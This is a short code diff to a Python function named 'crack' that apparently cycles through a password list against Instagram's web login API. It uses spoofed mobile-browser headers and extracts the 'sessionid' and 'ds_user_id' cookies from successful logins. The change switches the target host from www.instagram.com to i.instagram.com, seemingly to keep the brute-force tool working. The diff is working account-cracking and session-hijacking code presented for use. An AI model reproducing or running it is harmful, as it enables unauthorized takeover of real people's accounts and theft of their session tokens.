@@ -112,7 +112,7 @@ def crack(uid, password_list, total_count):
             'ig_nrcb': '1',
             'wd': '1136x773',}
             headers = {
-            'Host': 'www.instagram.com',
+            'Host': 'i.instagram.com',
             'content-length': '1212',
             'sec-ch-ua': '""Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="115"',
             'x-ig-app-id': '1217981644879628',
@@ -146,7 +146,7 @@ def crack(uid, password_list, total_count):
             'username': uid,
             'jazoest': '22898',}
             # Make API request
-            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
